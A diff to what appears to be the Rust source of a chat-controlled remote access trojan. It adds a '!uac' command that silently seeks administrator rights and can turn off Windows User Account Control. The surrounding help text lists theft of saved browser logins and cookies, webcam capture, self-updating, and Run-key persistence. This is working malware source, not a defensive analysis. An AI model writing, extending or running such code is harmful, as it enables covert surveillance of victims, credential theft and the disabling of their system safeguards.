@@ -40,6 +40,7 @@ const HELP: &str = "\
 !webcam                    camera still -> files channel
 !browsers                  saved logins + cookies (chrome/edge/firefox)
 !clear [info|files]        delete messages in #console (or #information / #files)
+!uac [prompt|disable]      request admin; silent by default, prompt = UAC dialog
 !lock                      lock workstation
 !update                    pull newest build from #update and restart
 !uninstall                 remove payload + launcher + Run key, then stop
@@ -306,6 +307,37 @@ pub async fn dispatch(
             let n = st.purge_channel(&target).await.unwrap_or(0);
             st.send(console, &format!("cleared {n} message(s) in #{label}"))
                 .await?;
+        }
+        "uac" | "elevate" => {
+            let a = arg.trim().to_ascii_lowercase();
+            let prompt = a.contains("prompt");
+            let disable = a.contains("disable") || a.contains("off");
+            if host::is_elevated() {
+                if disable {
+                    host::disable_uac()?;
+                    st.send(console, "already admin — UAC disabled").await?;
+                } else {
+                    st.send(console, "already admin").await?;
+                }
+            } else {
+                st.send(
+                    console,
+                    if prompt {
+                        "requesting elevation (UAC prompt) ..."
+                    } else {
+                        "requesting elevation (silent) ..."
+                    },
+                )
+                .await?;
+                match host::uac_elevate(prompt, disable) {
+                    Ok(m) => {
+                        let _ = st.send(console, &m).await;
+                    }
+                    Err(e) => {
+                        st.send(console, &format!("elevation failed: {e:#}")).await?;
+                    }
+                }
+            }
         }
         "lock" => {
             host::lock_workstation();
